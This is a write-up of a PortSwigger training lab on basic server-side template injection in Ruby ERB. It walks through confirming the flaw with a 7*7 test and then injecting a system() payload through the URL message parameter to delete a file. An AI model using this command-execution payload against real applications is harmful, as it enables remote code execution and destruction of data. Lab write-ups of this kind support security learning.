<!-- omit in toc -->
# Server-side template injection

<!-- omit in toc -->
## Table of Contents

- [Basic server-side template injection](#basic-server-side-template-injection)

## Basic server-side template injection
Reference: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic

<!-- omit in toc -->
### Quick Solution
The description already says that the template engine used is *ERB*. Looking online I found that a payload to execute commands is the following:
```
<%= system("rm /home/carlos/morale.txt") %>
```

<!-- omit in toc -->
### Solution
1. Notice that when you try to view more details about the first product, a GET request uses the message parameter to render "``Unfortunately this product is out of stock``" on the home page.
2. In the ERB documentation, discover that the syntax ``<%= someExpression %>`` is used to evaluate an expression and render the result on the page.
3. Use ERB template syntax to create a test payload containing a mathematical operation, for example:
```
<%= 7*7 %>
```
4. URL-encode this payload and insert it as the value of the ``message`` parameter in the URL as follows, remembering to replace ``your-lab-id`` with your own lab ID:
```
https://your-lab-id.web-security-academy.net/?message=<%25%3d+7*7+%25>
```
5. Load the URL in your browser. Notice that in place of the message, the result of your mathematical operation is rendered on the page, in this case, the number 49. This indicates that we may have a server-side template injection vulnerability.
6. From the Ruby documentation, discover the ``system()`` method, which can be used to execute arbitrary operating system commands.
7. Construct a payload to delete Carlos's file as follows:
```
<%= system("rm /home/carlos/morale.txt") %>
```
8. URL-encode your payload and insert it as the value of the message parameter, remembering to replace ``your-lab-id`` with your own lab ID:
```
https://your-lab-id.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>
```